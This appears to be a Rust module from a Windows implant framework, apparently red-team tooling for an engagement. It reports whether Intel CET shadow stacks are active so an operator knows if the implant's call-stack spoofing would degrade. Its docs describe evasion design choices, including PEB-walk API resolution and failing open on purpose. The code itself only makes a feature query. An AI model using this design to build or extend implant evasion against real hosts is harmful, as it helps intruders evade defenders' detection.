//! Caller-spoof diagnostic — CET shadow-stack probe only.
//!
//! # Status
//! The return-address spoofing machinery (`ReturnStub` scanner,
//! `call_with_spoofed_return` / `call_with_spoofed_return!`, `call_plain`) was
//! **removed** — it was dead code with no production call site, and its ABI
//! premise was wrong: the Win64 convention requires the CALL **site** RSP to be
//! 16-aligned, i.e. the target's entry RSP to be 8 mod 16, but the old
//! implementation delivered the target with a 16-aligned entry RSP (via a
//! `sub rsp, reserve` whose size was pinned to a 16-multiple). That misalignment
//! plus the fake frame's shadow-space placement inside compiler-owned frame
//! regions could not be made sound without a naked asm shim, and the module
//! could not be validated on the engagement target (Server 2019 17763, no CET).
//! Deleting it removes ~460 lines of unexercised, unsound call-spoofing claims.
//!
//! What remains is the **CET probe** (`[`is_cet_enabled`]`), which is live:
//! `nyx_selftest_cet_status` reports it as an operator diagnostic, and the
//! loader's host-side probe (`nyx-loader/src/dll_probe.rs`) mirrors the same
//! `IsProcessorFeaturePresent(PF_RETURN_CONTROL_ENFORCE)` query so the two
//! agree. The probe answers "would a return-address spoof path degrade here?",
//! which the remaining call-stack-spoofing code in [`nyx_implant_core::stack`] also uses.

#![cfg(target_os = "windows")]

/// Win64 feature constant for `IsProcessorFeaturePresent`: Intel CET shadow
/// stack (Hardware-enforced Stack Protection). Documented in winnt.h as
/// `PF_RETURN_CONTROL_ENFORCE` (value 41).
const PF_CET_SHADOW_STACK: u32 = 41;

/// Probe whether this process runs under Intel CET hardware-enforced shadow
/// stack (HSP). Resolves `kernel32!IsProcessorFeaturePresent` via the PEB walk
/// and queries feature 41. Returns `false` on any resolution failure (fail
/// OPEN — assume CET is off, so a spoof path is still attempted; a #CP there
/// would be loud, but a missing kernel32 export is far more likely than a
/// silently-on CET).
///
/// # Safety
/// Must run after PEB-walk bootstrap.
pub unsafe fn is_cet_enabled() -> bool {
    // Prefer kernel32 (always exports IsProcessorFeaturePresent on >= NT 6.1).
    let addr =
        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"IsProcessorFeaturePresent")
            .or_else(|| {
                nyx_implant_core::resolve::export_addr(
                    b"kernelbase.dll",
                    b"IsProcessorFeaturePresent",
                )
            });
    let Some(addr) = addr else {
        return false;
    };
    type FnIsPresent = unsafe extern "system" fn(u32) -> i32;
    let f: FnIsPresent = core::mem::transmute(addr);
    f(PF_CET_SHADOW_STACK) != 0
}

/// Selftest: report CET shadow-stack status. The return-address spoof path
/// that would have consumed this flag was removed (it was dead code with a
/// wrong Win64 alignment premise — see the module docs); the probe itself is
/// kept as a runtime diagnostic so the operator knows whether a spoof path
/// would have degraded on this host.
///
/// Returns:
///   0 = CET not present
///   1 = CET present
///
/// Note `is_cet_enabled` fails OPEN (returns `false`) if it cannot resolve
/// `IsProcessorFeaturePresent` — that resolution failure is indistinguishable
/// from "CET genuinely off" here. On a PEB-walk-bootstrapped implant the
/// resolver is reliable, so this only matters in the degenerate
/// pre-bootstrap window.
pub fn selftest_cet_status() -> u8 {
    if unsafe { is_cet_enabled() } {
        1
    } else {
        0
    }
}
